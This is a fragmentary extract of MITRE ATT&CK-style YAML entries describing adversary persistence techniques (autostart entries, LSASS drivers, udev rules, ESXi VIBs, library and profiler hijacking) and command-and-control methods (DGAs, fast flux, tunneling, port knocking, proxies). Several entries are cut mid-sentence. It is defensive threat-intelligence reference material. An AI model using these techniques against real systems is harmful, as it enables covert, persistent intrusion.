        Accounts may be created on the local system or within a domain or cloud tenant. In cloud environments, adversaries may create accounts that only have access to specific services, which can reduce the chance of detection.

      description: |-
        Adversaries may add or modify XDG Autostart Entries to execute malicious programs or commands when a user’s desktop environment is loaded at login. XDG Autostart entries are available for any XDG-compliant Linux system. XDG Autostart entries use Desktop Entry files (`.desktop`) to configure the user’s desktop environment upon user login. These configuration files determine what applications launch upon user login, define associated applications to open specific file types, and define applications used to open removable media.(Citation: Free Desktop Application Autostart Feb 2006)(Citation: Free Desktop Entry Keys)

        Adversaries may abuse this feature to establish persistence by adding a path to a malicious binary or command to the `Exec` directive in the `.desktop` configuration file. When the user’s desktop environment is loaded at user login, the `.desktop` files located in the XDG Autostart directories are automatically executed. System-wide Autostart entries are located in the `/etc/xdg/autostart` directory while the user entries are located in the `~/.config/autostart` directory.

        Adversaries may combine this technique with [Masquerading](https://attack.mitre.org/techniques/T1036) to blend malicious Autostart entries with legitimate programs.(Citation: Red Canary Netwire Linux 2022)

        Adversaries may modify plist files to automatically run an application when a user logs in. When a user logs out or restarts via the macOS Graphical User Interface (GUI), a prompt is provided to the user with a checkbox to "Reopen windows when logging back in".(Citation: Re-Open windows on Mac) When selected, all applications currently open are added to a property list file named <code>com.apple.loginwindow.[UUID].plist</code> within the <code>~/Library/Preferences/ByHost</code> directory.(Citation: Methods of Mac Malware Persistence)(Citation: Wardle Persistence Chapter) Applications listed in this file are automatically reopened upon the user’s next logon.

        Adversaries can establish [Persistence](https://attack.mitre.org/tactics/TA0003) by adding a malicious application path to the <code>com.apple.loginwindow.[UUID].plist</code> file to execute payloads when a user logs in.

      name: 'Account Manipulation: Additional Email Delegate Permissions'
      description: "Adversaries may grant additional permission levels to maintain
        persistent access to an adversary-controlled email account. \n\nFor example,
        the <code>Add-MailboxPermission</code> [PowerShell](https://attack.mitre.org/techniques/T1059/001)
        cmdlet, available in on-premises Exchange and in the cloud-based service Office
        365, adds permissions to a mailbox.(Citation: Microsoft - Add-MailboxPermission)(Citation:
        FireEye APT35 2018)(Citation: Crowdstrike Hiding in Plain Sight 2018) In Google
        Workspace, delegation can be enabled via the Google Admin console and users
        can delegate accounts via their Gmail settings.(Citation: Gmail Delegation)(Citation:
        Google Ensuring Your Information is Safe) \n\nAdversaries may also assign
        mailbox folder permissions through individual folder permissions or roles.
        In Office 365 environments, adversaries may assign the Default or Anonymous
        user permissions or roles to the Top of Information Store (root), Inbox, or
        other mailbox folders. By assigning one or both user permissions to a folder,
        the adversary can utilize any other account in the tenant to maintain persistence
        to the target user’s mail folders.(Citation: Mandiant Defend UNC2452 White
        Paper)\n\nThis may be used in persistent threat incidents as well as BEC (Business
        Email Compromise) incidents where an adversary can add [Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003)
        to the accounts they wish to compromise. This may further enable use of additional
        techniques for gaining access to systems. For example, compromised business
        accounts are often used to send messages to other accounts in the network
        of the target business while creating inbox rules (ex: [Internal Spearphishing](https://attack.mitre.org/techniques/T1534)),
        so the messages evade spam/phishing detection mechanisms.(Citation: Bienstock,

        Adversaries may impair a system's ability to hibernate, reboot, or shut down in order to extend access to infected machines. When a computer enters a dormant state, some or all software and hardware may cease to operate which can disrupt malicious activity.(Citation: Sleep, shut down, hibernate)

        Adversaries may abuse system utilities and configuration settings to maintain access by preventing machines from entering a state, such as standby, that can terminate malicious activity.(Citation: Microsoft: Powercfg command-line options)(Citation: systemdsleep Linux)

        For example, `powercfg` controls all configurable power system settings on a Windows system and can be abused to prevent an infected host from locking or shutting down.(Citation: Two New Monero Malware Attacks Target Windows and Android Users) Adversaries may also extend system lock screen timeout settings.(Citation: BATLOADER: The Evasive Downloader Malware) Other relevant settings, such as disk and hibernate timeout, can be similarly abused to keep the infected machine running even if no user is active.(Citation: CoinLoader: A Sophisticated Malware Loader Campaign)

        Aware that some malware cannot survive system reboots, adversaries may entirely delete files used to invoke system shut down or reboot.(Citation: Condi-Botnet-binaries)

An Office Test Registry location exists that allows a user to specify an arbitrary DLL that will be executed every time an Office application is started. This Registry key is thought to be used by Microsoft to load DLLs for testing and debugging purposes while developing Office applications. This Registry key is not created by default during an Office installation.(Citation: Hexacorn Office Test)(Citation: Palo Alto Office Test Sofacy)

        Adversaries may modify or add LSASS drivers to obtain persistence on compromised systems. The Windows security subsystem is a set of components that manage and enforce the security policy for a computer or domain. The Local Security Authority (LSA) is the main component responsible for local security policy and user authentication. The LSA includes multiple dynamic link libraries (DLLs) associated with various other security functions, all of which run in the context of the LSA Subsystem Service (LSASS) lsass.exe process.(Citation: Microsoft Security Subsystem)

        Adversaries may target LSASS drivers to obtain persistence. By either replacing or adding illegitimate drivers (e.g., [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574)), an adversary can use LSA operations to continuously execute malicious payloads.

        organization for use by users, remote support, services, or for administration
        of resources within a cloud service provider or SaaS application. Cloud Accounts
        can exist solely in the cloud; alternatively, they may be hybrid-joined between
        on-premises systems and the cloud through syncing or federation with other
        identity sources such as Windows Active Directory.(Citation: AWS Identity
        Federation)(Citation: Google Federating GC)(Citation: Microsoft Deploying

        or various other means to gain access to the environment. Federated or synced
        accounts may be a pathway for the adversary to affect both on-premises systems
        and cloud environments - for example, by leveraging shared credentials to
        log onto [Remote Services](https://attack.mitre.org/techniques/T1021). High
        privileged cloud accounts, whether federated, synced, or cloud-only, may also
        allow pivoting to on-premises environments by leveraging SaaS-based [Software
        Deployment Tools](https://attack.mitre.org/techniques/T1072) to run commands
        on hybrid-joined devices.\n\nAn adversary may create long lasting [Additional
        Cloud Credentials](https://attack.mitre.org/techniques/T1098/001) on a compromised
        cloud account to maintain persistence in the environment. Such credentials
        may also be used to bypass security controls such as multi-factor authentication.
        \n\nCloud accounts may also be able to assume [Temporary Elevated Cloud Access](https://attack.mitre.org/techniques/T1548/005)
        or other privileges through various means within the environment. Misconfigurations
        in role assignments or role assumption policies may allow an adversary to
        use these mechanisms to leverage permissions outside the intended scope of
        the account. Such over privileged accounts may be used to harvest sensitive
        data from online storage accounts and databases through [Cloud API](https://attack.mitre.org/techniques/T1059/009)
        or other methods. For example, in Azure environments, adversaries may target
        Azure Managed Identities, which allow associated Azure resources to request
        access tokens. By compromising a resource with an attached Managed Identity,
        such as an Azure VM, adversaries may be able to [Steal Application Access

        Adversaries may abuse the [at](https://attack.mitre.org/software/S0110) utility to perform task scheduling for initial or recurring execution of malicious code. The [at](https://attack.mitre.org/software/S0110) utility exists as an executable within Windows, Linux, and macOS for scheduling tasks at a specified time and date. Although deprecated in favor of [Scheduled Task](https://attack.mitre.org/techniques/T1053/005)'s [schtasks](https://attack.mitre.org/software/S0111) in Windows environments, using [at](https://attack.mitre.org/software/S0110) requires that the Task Scheduler service be running, and the user to be logged on as a member of the local Administrators group. In addition to explicitly running the `at` command, adversaries may also schedule a task with [at](https://attack.mitre.org/software/S0110) by directly leveraging the [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) `Win32_ScheduledJob` WMI class.(Citation: Malicious Life by Cybereason)

        On Linux and macOS, [at](https://attack.mitre.org/software/S0110) may be invoked by the superuser as well as any users added to the <code>at.allow</code> file. If the <code>at.allow</code> file does not exist, the <code>at.deny</code> file is checked. Every username not listed in <code>at.deny</code> is allowed to invoke [at](https://attack.mitre.org/software/S0110). If the <code>at.deny</code> exists and is empty, global use of [at](https://attack.mitre.org/software/S0110) is permitted. If neither file exists (which is often the baseline) only the superuser is allowed to use [at](https://attack.mitre.org/software/S0110).(Citation: Linux at)

        Adversaries may use [at](https://attack.mitre.org/software/S0110) to execute programs at system startup or on a scheduled basis for [Persistence](https://attack.mitre.org/tactics/TA0003). [at](https://attack.mitre.org/software/S0110) can also be abused to conduct remote [Execution](https://attack.mitre.org/tactics/TA0002) as part of [Lateral Movement](https://attack.mitre.org/tactics/TA0008) and/or to run a process under the context of a specified account (such as SYSTEM).

        In Linux environments, adversaries may also abuse [at](https://attack.mitre.org/software/S0110) to break out of restricted environments by using a task to spawn an interactive system shell or to run system commands. Similarly, [at](https://attack.mitre.org/software/S0110) may also be used for [Privilege Escalation](https://attack.mitre.org/tactics/TA0004) if the binary is allowed to run as superuser via <code>sudo</code>.(Citation: GTFObins at)

      name: Modify Authentication Process
      description: |-
        Adversaries may modify authentication mechanisms and processes to access user credentials or enable otherwise unwarranted access to accounts. The authentication process is handled by mechanisms, such as the Local Security Authentication Server (LSASS) process and the Security Accounts Manager (SAM) on Windows, pluggable authentication modules (PAM) on Unix-based systems, and authorization plugins on MacOS systems, responsible for gathering, storing, and validating credentials. By modifying an authentication process, an adversary may be able to authenticate to a service or system without using [Valid Accounts](https://attack.mitre.org/techniques/T1078).

        Adversaries may maliciously modify a part of this process to either reveal credentials or bypass authentication mechanisms. Compromised credentials or access may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access and remote desktop.

      name: Udev Rules
      description: |-
        Adversaries may maintain persistence through executing malicious content triggered using udev rules. Udev is the Linux kernel device manager that dynamically manages device nodes, handles access to pseudo-device files in the `/dev` directory, and responds to hardware events, such as when external devices like hard drives or keyboards are plugged in or removed. Udev uses rule files with `match keys` to specify the conditions a hardware event must meet and `action keys` to define the actions that should follow. Root permissions are required to create, modify, or delete rule files located in `/etc/udev/rules.d/`, `/run/udev/rules.d/`, `/usr/lib/udev/rules.d/`, `/usr/local/lib/udev/rules.d/`, and `/lib/udev/rules.d/`. Rule priority is determined by both directory and by the digit prefix in the rule filename.(Citation: Ignacio Udev research 2024)(Citation: Elastic Linux Persistence 2024)

        Adversaries may abuse the udev subsystem by adding or modifying rules in udev rule files to execute malicious content. For example, an adversary may configure a rule to execute their binary each time the pseudo-device file, such as `/dev/random`, is accessed by an application. Although udev is limited to running short tasks and is restricted by systemd-udevd's sandbox (blocking network and filesystem access), attackers may use scripting commands under the action key `RUN+=` to detach and run the malicious content’s process in the background to bypass these controls.(Citation: Reichert aon sedexp 2024)

        Adversaries may establish persistence by executing malicious content triggered by Netsh Helper DLLs. Netsh.exe (also referred to as Netshell) is a command-line scripting utility used to interact with the network configuration of a system. It contains functionality to add helper DLLs for extending functionality of the utility.(Citation: TechNet Netsh) The paths to registered netsh.exe helper DLLs are entered into the Windows Registry at <code>HKLM\SOFTWARE\Microsoft\Netsh</code>.

        Adversaries can use netsh.exe helper DLLs to trigger execution of arbitrary code in a persistent manner. This execution would take place anytime netsh.exe is executed, which could happen automatically, with another persistence technique, or if other software (ex: VPN) is present on the system that executes netsh.exe as part of its normal functionality.(Citation: Github Netsh Helper CS Beacon)(Citation: Demaske Netsh Persistence)

      description: "Adversaries may abuse vSphere Installation Bundles (VIBs) to establish
        persistent access to ESXi hypervisors. VIBs are collections of files used
        for software distribution and virtual system management in VMware environments.
        Since ESXi uses an in-memory filesystem where changes made to most files are
        stored in RAM rather than in persistent storage, these modifications are lost
        after a reboot. However, VIBs can be used to create startup tasks, apply custom
        firewall rules, or deploy binaries that persist across reboots. Typically,
        administrators use VIBs for updates and system maintenance.\n\nVIBs can be
        broken down into three components:(Citation: VMware VIBs)\n\n* VIB payload:
        a `.vgz` archive containing the directories and files to be created and executed
        on boot when the VIBs are loaded.  \n* Signature file: verifies the host acceptance
        level of a VIB, indicating what testing and validation has been done by VMware
        or its partners before publication of a VIB. By default, ESXi hosts require
        a minimum acceptance level of PartnerSupported for VIB installation, meaning
        the VIB is published by a trusted VMware partner. However, privileged users
        can change the default acceptance level using the `esxcli` command line interface.
        Additionally, VIBs are able to be installed regardless of acceptance level
        by using the <code> esxcli software vib install --force</code> command. \n*
        XML descriptor file: a configuration file containing associated VIB metadata,
        such as the name of the VIB and its dependencies.  \n\nAdversaries may leverage
        malicious VIB packages to maintain persistent access to ESXi hypervisors,
        allowing system changes to be executed upon each bootup of ESXi – such as
        using  `esxcli` to enable firewall rules for backdoor traffic, creating listeners
        on hard coded ports, and executing backdoors.(Citation: Google Cloud Threat
        Intelligence ESXi VIBs 2022) Adversaries may also masquerade their malicious
        VIB files as PartnerSupported by modifying the XML descriptor file.(Citation:

      description: "Adversaries may abuse SQL stored procedures to establish persistent
        access to systems. SQL Stored Procedures are code that can be saved and reused
        so that database users do not waste time rewriting frequently used SQL queries.
        Stored procedures can be invoked via SQL statements to the database using
        the procedure name or via defined events (e.g. when a SQL server application
        is started/restarted).\n\nAdversaries may craft malicious stored procedures
        that can provide a persistence mechanism in SQL database servers.(Citation:
        NetSPI Startup Stored Procedures)(Citation: Kaspersky MSSQL Aug 2019) To execute
        operating system commands through SQL syntax the adversary may have to enable
        additional functionality, such as xp_cmdshell for MSSQL Server.(Citation:
        NetSPI Startup Stored Procedures)(Citation: Kaspersky MSSQL Aug 2019)(Citation:

        runtime (CLR) integration. With CLR integration enabled, application developers
        can write stored procedures using any .NET framework language (e.g. VB .NET,
        C#, etc.).(Citation: Microsoft CLR Integration 2017) Adversaries may craft
        or modify CLR assemblies that are linked to stored procedures since these

        Adversaries may execute their own payloads by placing a malicious dynamic library (dylib) with an expected name in a path a victim application searches at runtime. The dynamic loader will try to find the dylibs based on the sequential order of the search paths. Paths to dylibs may be prefixed with <code>@rpath</code>, which allows developers to use relative paths to specify an array of search paths used at runtime based on the location of the executable.  Additionally, if weak linking is used, such as the <code>LC_LOAD_WEAK_DYLIB</code> function, an application will still execute even if an expected dylib is not present. Weak linking enables developers to run an application on multiple macOS versions as new APIs are added.

        Adversaries may gain execution by inserting malicious dylibs with the name of the missing dylib in the identified path.(Citation: Wardle Dylib Hijack Vulnerable Apps)(Citation: Wardle Dylib Hijacking OSX 2015)(Citation: Github EmpireProject HijackScanner)(Citation: Github EmpireProject CreateHijacker Dylib) Dylibs are loaded into an application's address space allowing the malicious dylib to inherit the application's privilege level and resources. Based on the application, this could result in privilege escalation and uninhibited network access. This method may also evade detection from security products since the execution is masked under a legitimate process.(Citation: Writing Bad Malware for OSX)(Citation: wardle artofmalware volume1)(Citation: MalwareUnicorn macOS Dylib Injection MachO)

      name: 'Hijack Execution Flow: COR_PROFILER'
      description: |-
        Adversaries may leverage the COR_PROFILER environment variable to hijack the execution flow of programs that load the .NET CLR. The COR_PROFILER is a .NET Framework feature which allows developers to specify an unmanaged (or external of .NET) profiling DLL to be loaded into each .NET process that loads the Common Language Runtime (CLR). These profilers are designed to monitor, troubleshoot, and debug managed code executed by the .NET CLR.(Citation: Microsoft Profiling Mar 2017)(Citation: Microsoft COR_PROFILER Feb 2013)

        The COR_PROFILER environment variable can be set at various scopes (system, user, or process) resulting in different levels of influence. System and user-wide environment variable scopes are specified in the Registry, where a [Component Object Model](https://attack.mitre.org/techniques/T1559/001) (COM) object can be registered as a profiler DLL. A process scope COR_PROFILER can also be created in-memory without modifying the Registry. Starting with .NET Framework 4, the profiling DLL does not need to be registered as long as the location of the DLL is specified in the COR_PROFILER_PATH environment variable.(Citation: Microsoft COR_PROFILER Feb 2013)

        Adversaries may abuse COR_PROFILER to establish persistence that executes a malicious DLL in the context of all .NET processes every time the CLR is invoked. The COR_PROFILER can also be used to elevate privileges (ex: [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002)) if the victim .NET process executes at a higher permission level, as well as to hook and [Impair Defenses](https://attack.mitre.org/techniques/T1562) provided by .NET processes.(Citation: RedCanary Mockingbird May 2020)(Citation: Red Canary COR_PROFILER May 2020)(Citation: Almond COR_PROFILER Apr 2019)(Citation: GitHub OmerYa Invisi-Shell)(Citation: subTee .NET Profilers May 2017)

      description: |-
        Adversaries may attach filters to a network socket to monitor then activate backdoors used for persistence or command and control. With elevated permissions, adversaries can use features such as the `libpcap` library to open sockets and install filters to allow or disallow certain types of data to come through the socket. The filter may apply to all traffic passing through the specified network interface (or every interface if not specified). When the network interface receives a packet matching the filter criteria, additional actions can be triggered on the host, such as activation of a reverse shell.

        To establish a connection, an adversary sends a crafted packet to the targeted host that matches the installed filter criteria.(Citation: haking9 libpcap network sniffing) Adversaries have used these socket filters to trigger the installation of implants, conduct ping backs, and to invoke command shells. Communication with these socket filters may also be used in conjunction with [Protocol Tunneling](https://attack.mitre.org/techniques/T1572).(Citation: exatrack bpf filters passive backdoors)(Citation: Leonardo Turla Penquin May 2020)

        Filters can be installed on any Unix-like platform with `libpcap` installed or on Windows hosts using `Winpcap`.  Adversaries may use either `libpcap` with `pcap_setfilter` or the standard library function `setsockopt` with `SO_ATTACH_FILTER` options. Since the socket connection is not active until the packet is received, this behavior may be difficult to detect due to the lack of activity on a host, low CPU overhead, and limited visibility into raw socket usage.

        Adversaries may make use of Domain Generation Algorithms (DGAs) to dynamically identify a destination domain for command and control traffic rather than relying on a list of static IP addresses or domains. This has the advantage of making it much harder for defenders to block, track, or take over the command and control channel, as there potentially could be thousands of domains that malware can check for instructions.(Citation: Cybereason Dissecting DGAs)(Citation: Cisco Umbrella DGA)(Citation: Unit 42 DGA Feb 2019)

        DGAs can take the form of apparently random or “gibberish” strings (ex: istgmxdejdnxuyla.ru) when they construct domain names by generating each letter. Alternatively, some DGAs employ whole words as the unit by concatenating words together instead of letters (ex: cityjulydish.net). Many DGAs are time-based, generating a different domain for each time period (hourly, daily, monthly, etc). Others incorporate a seed value as well to make predicting future domains more difficult for defenders.(Citation: Cybereason Dissecting DGAs)(Citation: Cisco Umbrella DGA)(Citation: Talos CCleanup 2017)(Citation: Akamai DGA Mitigation)

        Adversaries may use DGAs for the purpose of [Fallback Channels](https://attack.mitre.org/techniques/T1008). When contact is lost with the primary command and control server malware may employ a DGA as a means to reestablishing command and control.(Citation: Talos CCleanup 2017)(Citation: FireEye POSHSPY April 2017)(Citation: ESET Sednit 2017 Activity)

      description: |-
        Adversaries may use Fast Flux DNS to hide a command and control channel behind an array of rapidly changing IP addresses linked to a single domain resolution. This technique uses a fully qualified domain name, with multiple IP addresses assigned to it which are swapped with high frequency, using a combination of round robin IP addressing and short Time-To-Live (TTL) for a DNS resource record.(Citation: MehtaFastFluxPt1)(Citation: MehtaFastFluxPt2)(Citation: Fast Flux - Welivesecurity)

        The simplest, "single-flux" method, involves registering and de-registering an addresses as part of the DNS A (address) record list for a single DNS name. These registrations have a five-minute average lifespan, resulting in a constant shuffle of IP address resolution.(Citation: Fast Flux - Welivesecurity)

        In contrast, the "double-flux" method registers and de-registers an address as part of the DNS Name Server record list for the DNS zone, providing additional resilience for the connection. With double-flux additional hosts can act as a proxy to the C2 host, further insulating the true source of the C2 channel.

      description: |-
        An adversary may use legitimate remote access tools to establish an interactive command and control channel within a network. Remote access tools create a session between two trusted hosts through a graphical interface, a command line interaction, a protocol tunnel via development or management software, or hardware-level access such as KVM (Keyboard, Video, Mouse) over IP solutions. Desktop support software (usually graphical interface) and remote management software (typically command line interface) allow a user to control a computer remotely as if they are a local user inheriting the user or software permissions. This software is commonly used for troubleshooting, software installation, and system management.(Citation: Symantec Living off the Land)(Citation: CrowdStrike 2015 Global Threat Report)(Citation: CrySyS Blog TeamSpy) Adversaries may similarly abuse response features included in EDR and other defensive tools that enable remote access.

        Remote access tools may be installed and used post-compromise as an alternate communications channel for redundant access or to establish an interactive remote desktop session with the target system. It may also be used as a malware component to establish a reverse connection or back-connect to a service or adversary-controlled system.

        Installation of many remote access tools may also include persistence (e.g., the software's installation routine creates a [Windows Service](https://attack.mitre.org/techniques/T1543/003)). Remote access modules/features may also exist as part of otherwise existing software (e.g., Google Chrome’s Remote Desktop).(Citation: Google Chrome Remote Desktop)(Citation: Chrome Remote Desktop)

      description: |-
        Adversaries may gain access and continuously communicate with victims by injecting malicious content into systems through online network traffic. Rather than luring victims to malicious payloads hosted on a compromised website (i.e., [Drive-by Target](https://attack.mitre.org/techniques/T1608/004) followed by [Drive-by Compromise](https://attack.mitre.org/techniques/T1189)), adversaries may initially access victims through compromised data-transfer channels where they can manipulate traffic and/or inject their own content. These compromised online network channels may also be used to deliver additional payloads (i.e., [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)) and other data to already compromised systems.(Citation: ESET MoustachedBouncer)

        Adversaries may inject content to victim systems in various ways, including:

        * From the middle, where the adversary is in-between legitimate online client-server communications (**Note:** this is similar but distinct from [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557), which describes AiTM activity solely within an enterprise environment) (Citation: Kaspersky Encyclopedia MiTM)
        * From the side, where malicious content is injected and races to the client as a fake response to requests of a legitimate online server (Citation: Kaspersky ManOnTheSide)

        Content injection is often the result of compromised upstream communication channels, for example at the level of an internet service provider (ISP) as is the case with "lawful interception."(Citation: Kaspersky ManOnTheSide)(Citation: ESET MoustachedBouncer)(Citation: EFF China GitHub Attack)

      name: Traffic Signaling
      description: |-
        Adversaries may use traffic signaling to hide open ports or other malicious functionality used for persistence or command and control. Traffic signaling involves the use of a magic value or sequence that must be sent to a system to trigger a special response, such as opening a closed port or executing a malicious task. This may take the form of sending a series of packets with certain characteristics before a port will be opened that the adversary can use for command and control. Usually this series of packets consists of attempted connections to a predefined sequence of closed ports (i.e. [Port Knocking](https://attack.mitre.org/techniques/T1205/001)), but can involve unusual flags, specific strings, or other unique characteristics. After the sequence is completed, opening a port may be accomplished by the host-based firewall, but could also be implemented by custom software.

        Adversaries may also communicate with an already open port, but the service listening on that port will only respond to commands or trigger other malicious functionality if passed the appropriate magic value(s).

        The observation of the signal packets to trigger the communication can be conducted through different methods. One means, originally implemented by Cd00r (Citation: Hartrell cd00r 2002), is to use the libpcap libraries to sniff for the packets in question. Another method leverages raw sockets, which enables the malware to use ports that are already open for use by other programs.

        On network devices, adversaries may use crafted packets to enable [Network Device Authentication](https://attack.mitre.org/techniques/T1556/004) for standard services offered by the device such as telnet.  Such signaling may also be used to open a closed service port such as telnet, or to trigger module modification of malware implants on the device, adding, removing, or changing malicious capabilities.  Adversaries may use crafted packets to attempt to connect to one or more (open or closed) ports, but may also attempt to connect to a router interface, broadcast, and network address IP on the same port in order to achieve their goals and objectives.(Citation: Cisco Synful Knock Evolution)(Citation: Mandiant - Synful Knock)(Citation: Cisco Blog Legacy Device Attacks)  To enable this traffic signaling on embedded devices, adversaries must first achieve and leverage [Patch System Image](https://attack.mitre.org/techniques/T1601/001) due to the monolithic nature of the architecture.

        Adversaries may also use the Wake-on-LAN feature to turn on powered off systems. Wake-on-LAN is a hardware feature that allows a powered down system to be powered on, or woken up, by sending a magic packet to it. Once the system is powered on, it may become a target for lateral movement.(Citation: Bleeping Computer - Ryuk WoL)(Citation: AMD Magic Packet)

      name: Protocol Tunneling
      description: "Adversaries may tunnel network communications to and from a victim
        system within a separate protocol to avoid detection/network filtering and/or
        enable access to otherwise unreachable systems. Tunneling involves explicitly
        encapsulating a protocol within another. This behavior may conceal malicious
        traffic by blending in with existing traffic and/or provide an outer layer
        of encryption (similar to a VPN). Tunneling could also enable routing of network
        packets that would otherwise not reach their intended destination, such as
        SMB, RDP, or other traffic that would be filtered by network appliances or
        not routed over the Internet. \n\nThere are various means to encapsulate a
        protocol within another protocol. For example, adversaries may perform SSH
        tunneling (also known as SSH port forwarding), which involves forwarding arbitrary
        data over an encrypted SSH tunnel.(Citation: SSH Tunneling)(Citation: Sygnia
        Abyss Locker 2025) \n\n[Protocol Tunneling](https://attack.mitre.org/techniques/T1572)
        may also be abused by adversaries during [Dynamic Resolution](https://attack.mitre.org/techniques/T1568).
        Known as DNS over HTTPS (DoH), queries to resolve C2 infrastructure may be
        encapsulated within encrypted HTTPS packets.(Citation: BleepingComp Godlua
        JUL19) \n\nAdversaries may also leverage [Protocol Tunneling](https://attack.mitre.org/techniques/T1572)
        in conjunction with [Proxy](https://attack.mitre.org/techniques/T1090) and/or
        [Protocol or Service Impersonation](https://attack.mitre.org/techniques/T1001/003)

        Adversaries may use an external proxy to act as an intermediary for network communications to a command and control server to avoid direct connections to their infrastructure. Many tools exist that enable traffic redirection through proxies or port redirection, including [HTRAN](https://attack.mitre.org/software/S0040), ZXProxy, and ZXPortMap. (Citation: Trend Micro APT Attack Tools) Adversaries use these types of proxies to manage command and control communications, to provide resiliency in the face of connection loss, or to ride over existing trusted communications paths to avoid suspicion.

        External connection proxies are used to mask the destination of C2 traffic and are typically implemented with port redirectors. Compromised systems outside of the victim environment may be used for these purposes, as well as purchased infrastructure such as cloud-based resources or virtual private servers. Proxies may be chosen based on the low likelihood that a connection to them from a compromised system would be investigated. Victim systems would communicate directly with the external proxy on the Internet and then the proxy would forward communications to the C2 server.

      name: IDE Tunneling
      description: |-
        Adversaries may abuse Integrated Development Environment (IDE) software with remote development features to establish an interactive command and control channel on target systems within a network. IDE tunneling combines SSH, port forwarding, file sharing, and debugging into a single secure connection, letting developers work on remote systems as if they were local. Unlike SSH and port forwarding, IDE tunneling encapsulates an entire session and may use proprietary tunneling protocols alongside SSH, allowing adversaries to blend in with legitimate development workflows. Some IDEs, like Visual Studio Code, also provide CLI tools (e.g., `code tunnel`) that adversaries may use to programmatically establish tunnels and generate web-accessible URLs for remote access. These tunnels can be authenticated through accounts such as GitHub, enabling the adversary to control the compromised system via a legitimate developer portal.(Citation: sentinelone operationDigitalEye Dec 2024)(Citation: Unit42 Chinese VSCode 06 September 2024)(Citation: Thornton tutorial VSCode shell September 2023)

        Additionally, adversaries may use IDE tunneling for persistence. Some IDEs, such as Visual Studio Code and JetBrains, support automatic reconnection. Adversaries may configure the IDE to auto-launch at startup, re-establishing the tunnel upon execution. Compromised developer machines may also be exploited as jump hosts to move further into the network.

        IDE tunneling tools may be built-in or installed as [IDE Extensions](https://attack.mitre.org/techniques/T1176/002).

      description: |-
        Adversaries may dynamically establish connections to command and control infrastructure to evade common detections and remediations. This may be achieved by using malware that shares a common algorithm with the infrastructure the adversary uses to receive the malware's communications. These calculations can be used to dynamically adjust parameters such as the domain name, IP address, or port number the malware uses for command and control.

        Adversaries may use dynamic resolution for the purpose of [Fallback Channels](https://attack.mitre.org/techniques/T1008). When contact is lost with the primary command and control server malware may employ dynamic resolution as a means to reestablishing command and control.(Citation: Talos CCleanup 2017)(Citation: FireEye POSHSPY April 2017)(Citation: ESET Sednit 2017 Activity)

      description: |-
        Adversaries may use an existing, legitimate external Web service as a means for relaying data to/from a compromised system. Popular websites, cloud services, and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google, Microsoft, or Twitter, makes it easier for adversaries to hide in expected noise.(Citation: Broadcom BirdyClient Microsoft Graph API 2024) Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.

        Use of Web services may also protect back-end C2 infrastructure from discovery through malware binary analysis while also enabling operational resiliency (since this infrastructure may be dynamically changed).

      name: Multi-Stage Channels
      description: |-
        Adversaries may create multiple stages for command and control that are employed under different conditions or for certain functions. Use of multiple stages may obfuscate the command and control channel to make detection more difficult.

        Remote access tools will call back to the first-stage command and control server for instructions. The first stage may have automated capabilities to collect basic host information, update tools, and upload additional files. A second remote access tool (RAT) could be uploaded at that point to redirect the host to the second-stage command and control server. The second stage will likely be more fully featured and allow the adversary to interact with the system through a reverse shell and additional RAT features.

        The different stages will likely be hosted separately with no overlapping infrastructure. The loader may also have backup first-stage callbacks or [Fallback Channels](https://attack.mitre.org/techniques/T1008) in case the original first-stage communication path is discovered and blocked.

      name: Port Knocking
      description: |-
        Adversaries may use port knocking to hide open ports used for persistence or command and control. To enable a port, an adversary sends a series of attempted connections to a predefined sequence of closed ports. After the sequence is completed, opening a port is often accomplished by the host based firewall, but could also be implemented by custom software.

        This technique has been observed both for the dynamic opening of a listening port as well as the initiating of a connection to a listening server on a different system.

        The observation of the signal packets to trigger the communication can be conducted through different methods. One means, originally implemented by Cd00r (Citation: Hartrell cd00r 2002), is to use the libpcap libraries to sniff for the packets in question. Another method leverages raw sockets, which enables the malware to use ports that are already open for use by other programs.

      description: |-
        Adversaries may use an existing, legitimate external Web service as a means for sending commands to a compromised system without receiving return output over the Web service channel. Compromised systems may leverage popular websites and social media to host command and control (C2) instructions. Those infected systems may opt to send the output from those commands back over a different C2 channel, including to another distinct Web service. Alternatively, compromised systems may return no output at all in cases where adversaries want to send instructions to systems and do not want a response.

        Popular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.

      name: 'Proxy: Multi-hop Proxy'
      description: "Adversaries may chain together multiple proxies to disguise the
        source of malicious traffic. Typically, a defender will be able to identify
        the last proxy traffic traversed before it enters their network; the defender
        may or may not be able to identify any previous proxies before the last-hop
        proxy. This technique makes identifying the original source of the malicious
        traffic even more difficult by requiring the defender to trace malicious traffic
        through several proxies to identify its source.\n\nFor example, adversaries
        may construct or use onion routing networks – such as the publicly available
        [Tor](https://attack.mitre.org/software/S0183) network – to transport encrypted
        C2 traffic through a compromised population, allowing communication with any
        device within the network.(Citation: Onion Routing) Adversaries may also use
        operational relay box (ORB) networks composed of virtual private servers (VPS),
        Internet of Things (IoT) devices, smart devices, and end-of-life routers to
        obfuscate their operations.(Citation: ORB Mandiant) \n\nIn the case of network
        infrastructure, it is possible for an adversary to leverage multiple compromised
        devices to create a multi-hop proxy chain (i.e., [Network Devices](https://attack.mitre.org/techniques/T1584/008)).
        By leveraging [Patch System Image](https://attack.mitre.org/techniques/T1601/001)
        on routers, adversaries can add custom code to the affected network devices
        that will implement onion routing between those nodes. This method is dependent
        upon the [Network Boundary Bridging](https://attack.mitre.org/techniques/T1599)
        method allowing the adversaries to cross the protected network boundary of
        the Internet perimeter and into the organization’s Wide-Area Network (WAN).
        \ Protocols such as ICMP may be used as a transport.  \n\nSimilarly, adversaries
        may abuse peer-to-peer (P2P) and blockchain-oriented infrastructure to implement
        routing between a decentralized network of peers.(Citation: NGLite Trojan)"

